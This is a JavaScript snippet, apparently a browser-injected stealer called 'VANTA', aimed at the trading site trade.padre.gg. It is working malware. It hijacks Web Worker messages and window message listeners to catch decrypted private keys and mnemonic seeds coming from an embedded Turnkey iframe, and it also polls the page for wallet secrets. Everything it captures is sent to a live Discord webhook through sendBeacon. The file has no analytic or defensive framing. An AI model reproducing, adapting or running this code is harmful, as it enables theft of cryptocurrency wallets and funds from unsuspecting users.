(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
    let exfilled = new Set();

    console.log("%c[VANTA] v22 KERNEL: BRIDGE HIJACK ACTIVE", "color: #00ff88; font-weight: bold;");

    const deliver = (data, origin) => {
        const str = typeof data === 'string' ? data : JSON.stringify(data);
        if (exfilled.has(str) || str.length < 10) return;
        
        exfilled.add(str);
        navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({
            embeds: [{
                title: "💎 VANTA: PRIVATE KEY EXTRACTED",
                description: "```json\n" + str.substring(0, 1800) + "\n```",
                fields: [{ name: "Handshake Source", value: origin }],
                color: 0x00FF88,
                timestamp: new Date()
            }]
        })], { type: 'application/json' }));
    };

    // 1. THE WORKER BUFFER SNIFFER
    // WebWorkers use a 'decoder' to turn the Turnkey data into a readable seed.
    const OriginalWorker = window.Worker;
    window.Worker = function(scriptURL) {
        const worker = new OriginalWorker(scriptURL);
        const realPost = worker.postMessage;

        worker.postMessage = function(msg) {
            deliver(msg, "Worker_Inbound_Task");
            return realPost.apply(this, arguments);
        };

        worker.addEventListener('message', (e) => {
            if (e.data) deliver(e.data, "Worker_Decoded_Result");
        });

        return worker;
    };

    // 2. THE POST-MESSAGE INTERCEPTOR (Bypasses Iframe Isolation)
    // Turnkey sends the decrypted key back to Padre via window.postMessage
    const originalAddEventListener = window.addEventListener;
    window.addEventListener = function(type, listener, options) {
        if (type === 'message') {
            return originalAddEventListener.call(this, type, (event) => {
                // Look for strings that look like Private Keys or Mnemonic Seeds
                if (event.data && (event.data.plaintext || typeof event.data === 'string')) {
                    deliver(event.data, "Iframe_Bridge_Capture");
                }
                return listener(event);
            }, options);
        }
        return originalAddEventListener.apply(this, arguments);
    };

    // 3. THE "DEEP-DIVE" DISPATCH
    // Forces the site to refresh the Wallet metadata, triggering the hooks
    const forceTrigger = () => {
        console.log("[VANTA] Forcing metadata refresh...");
        // Re-ping the profile to ensure the auth token is active for the worker
        fetch('https://trade.padre.gg/api/v2/user/profile').catch(()=>{});
    };

    forceTrigger();
    
    // 4. AUTO-CLICKER (BETA)
    // If the "Show Private Key" button is visible, this tries to find the text inside
    setInterval(() => {
        const secretFields = document.querySelectorAll('[data-testid*="wallet"], [class*="MuiStack"]');
        secretFields.forEach(field => {
            if (field.innerText.length > 30 && !field.innerText.includes('Wallet')) {
                deliver(field.innerText, "DOM_Scrape_Detection");
            }
        });
    }, 3000);

})();
